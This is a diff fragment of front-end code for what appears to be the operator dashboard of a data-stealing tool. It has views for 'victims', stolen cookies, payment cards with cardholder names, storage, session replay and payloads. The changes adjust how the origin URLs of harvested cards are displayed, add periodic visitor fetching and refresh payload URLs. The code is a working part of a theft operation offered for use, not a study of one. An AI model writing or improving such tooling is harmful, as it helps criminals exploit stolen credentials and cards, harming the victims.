+                                    <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                     <div class="actions">
                                         <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
                                         <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
@@ -3756,7 +4037,10 @@
                         ${cards.map((c, idx) => {
                             let value = c.value || c.number || c.card_number || '';
                             const name = c.name || c.cardholder || c.holder || 'Unknown';
-                            const url = c.url || c.origin_url || domain;
+                            let url = c.url || c.origin_url || domain;
+                            if (url && !url.includes('http')) {
+                                url = 'https://' + url;
+                            }
                             const type = c.type || 'card';
                             if (!value || value === '' || value === 'undefined' || value === 'null') return '';
                             if (c.month && c.year && !value.includes('/')) {
@@ -3766,12 +4050,13 @@
                             const visKey = 'modal-card-' + idx;
                             const isVisible = passwordVisibility[visKey] || false;
                             const displayValue = isVisible ? value : value.replace(/[0-9]/g, '•');
+                            const displayUrl = url && url !== 'https://' ? url : 'https://' + domain;
                             return `
                                 <div class="data-item">
                                     <span class="label" style="color:#06b6d4;">${name}</span>
                                     <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${displayValue}</span>
                                     <span class="badge-type">${type}</span>
-                                    <a href="https://${url}" target="_blank" class="link">🔗 ${url.length > 30 ? url.slice(0,30)+'...' : url}</a>
+                                    <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                     <div class="actions">
                                         <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
                                         <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
@@ -4412,8 +4697,9 @@
                 });
                 fetchData();
                 fetchTrash();
+                fetchVisitors();
                 setInterval(() => {
-                    if (currentView === 'main') fetchData();
+                    if (currentView === 'main') { fetchData(); fetchVisitors(); }
                     else if (currentView === 'trash') fetchTrash();
                     else if (currentView === 'cookies') renderCookiesView();
                     else if (currentView === 'victims') renderVictimsView();
@@ -4421,6 +4707,7 @@
                     else if (currentView === 'cards') renderCardsView();
                     else if (currentView === 'storage') renderStorageView();
                     else if (currentView === 'replay') renderReplayView();
+                    else if (currentView === 'payload') updatePayloadUrls();
                 }, 10000);
                 document.getElementById('trashCount').textContent = trashData.length;
             });
